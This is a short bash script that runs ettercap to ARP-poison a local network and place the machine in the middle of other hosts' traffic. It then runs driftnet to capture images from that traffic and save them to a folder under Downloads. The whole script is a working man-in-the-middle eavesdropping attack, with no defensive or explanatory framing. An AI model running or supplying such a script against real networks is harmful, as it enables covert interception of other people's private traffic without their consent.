#!/usr/bin/env bash
SAVETO="$HOME/Downloads/tmp/drift/"
INTER="enp3s0"
test -d "${SAVETO}" || mkdir -p "${SAVETO}"
ettercap -T -Q -M arp -i "${INTER}"  &
driftnet -p -i "${INTER}" -ad "${SAVETO}"
killall ettercap
